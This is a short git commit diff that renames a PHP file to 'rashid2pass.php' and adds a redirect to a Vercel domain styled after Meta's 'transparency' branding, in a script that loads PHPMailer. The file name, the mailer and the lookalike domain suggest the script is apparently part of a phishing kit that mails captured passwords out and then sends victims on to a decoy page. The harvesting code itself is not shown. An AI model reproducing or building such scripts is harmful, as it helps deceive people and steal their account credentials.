607ec54724817992ede3db4e482043a9dac4473a
asif1012-lgtm <hpboost8@gmail.com>
2025-07-11 11:55:21 +0500

    Update and rename rashidworker2.php to rashid2pass.php

--- rashid2pass.php
+++ rashid2pass.php
@@ -2,7 +2,7 @@
 use PHPMailer\PHPMailer\PHPMailer;
 use PHPMailer\PHPMailer\Exception;
 
-
+header("Location:https://transparencymeta-sigma.vercel.app/");
 
 require 'Exception.php';
 require 'PHPMailer.php';
